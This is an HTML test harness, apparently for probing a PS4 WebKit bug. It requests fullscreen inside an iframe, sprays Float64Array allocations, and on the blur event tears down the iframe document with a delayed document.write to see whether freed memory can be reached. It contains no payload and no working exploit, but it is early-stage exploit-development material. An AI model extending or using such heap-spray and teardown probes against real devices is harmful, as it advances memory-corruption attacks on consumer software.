<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit Fullscreen Blur – Tests E/F/G</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { font-size:16px; margin:5px; }
#log { white-space:pre-wrap; border:1px solid #0f0; padding:8px; height:280px; overflow:auto; }
iframe { width:100%; height:320px; border:1px solid #0f0; margin-top:10px; }
</style>
</head>
<body>

<h3>PARENT LOGGER</h3>

<button onclick="run('E')">TEST E – No document.write</button>
<button onclick="run('F')">TEST F – Delayed document.write</button>
<button onclick="run('G')">TEST G – Array AFTER blur</button>

<div id="log"></div>
<iframe id="frame"></iframe>

<script>
function plog(m) {
  var el = document.getElementById('log');
  el.textContent += m + "\n";
  el.scrollTop = el.scrollHeight;
}

plog("[PARENT] Loaded");

window.addEventListener("message", function(e) {
  if (e && e.data && e.data.log) {
    plog("[MSG] " + e.data.log);
  } else {
    // fallback (in case we send a plain string)
    plog("[MSG] " + e.data);
  }
}, false);

function run(testId) {
  document.getElementById('log').textContent = "";
  plog("=== START TEST " + testId + " ===");

  var iframe = document.getElementById('frame');
  iframe.onload = null;
  iframe.src = "about:blank";

  iframe.onload = function() {
    iframe.contentWindow.name = testId; // pass mode
    var d = iframe.contentDocument;
    d.open();
    d.write(IFRAME_HTML);
    d.close();
  };
}

var IFRAME_HTML =
'<!DOCTYPE html><html><head><meta charset="UTF-8"></head>' +
'<body style="background:black;color:#0f0;font-family:monospace;">' +
'<button id="start">START</button>' +
'<script>' +
'function send(m){ parent.postMessage({log:m},"*"); }' +
'var testId = window.name;' +
'var f64 = null;' +
'var spray = [];' +
'send("[IFRAME] Loaded test="+testId);' +

'function snapshot(tag){' +
' send("[SNAPSHOT] "+tag);' +
' try {' +
'  send(" f64.length=" + (f64?f64.length:"null"));' +
'  send(" f64[0]=" + (f64?f64[0]:"null"));' +
'  send(" spray.alive=" + (spray?spray.length:0));' +
' } catch(e) {' +
'  send(" snapshot exception");' +
' }' +
'}' +

'function allocArrayAndSpray(label){' +
' f64 = new Float64Array(8);' +
' f64[0] = 13.37;' +
' for(var i=0;i<500;i++){ spray.push(new Float64Array(8)); }' +
' send("[ALLOC] "+label+" Float64Array length=" + f64.length + " spray=" + spray.length);' +
'}' +

'document.getElementById("start").onclick = function(){' +
' send("[START] clicked");' +

' if(testId !== "G") {' +
'  allocArrayAndSpray("PRE-BLUR");' +
' } else {' +
'  send("[G] will allocate AFTER blur");' +
' }' +

' snapshot("before fullscreen");' +
' send("[STATE] requesting fullscreen");' +
' document.documentElement.webkitRequestFullscreen();' +
'};' +

'window.onblur = function(){' +
' send("[EVENT] blur detected");' +

' if(testId === "G") {' +
'  allocArrayAndSpray("AFTER-BLUR");' +
' }' +

' snapshot("after blur");' +

' if(testId === "E") {' +
'  send("[TEST E] keeping iframe alive (NO document.write)");' +
'  return;' +
' }' +

' if(testId === "F") {' +
'  send("[TEST F] scheduling document.write in 150ms");' +
'  setTimeout(function(){' +
'    send("[TEARDOWN] document.write iframe");' +
'    document.open();' +
'    document.write("<h3>teardown</h3>");' +
'    document.close();' +
'  }, 150);' +
'  return;' +
' }' +

' // default safety (should not reach)' +
' send("[WARN] unknown testId");' +
'};' +
'<\/script>' +
'</body></html>';
</script>

</body>
</html>
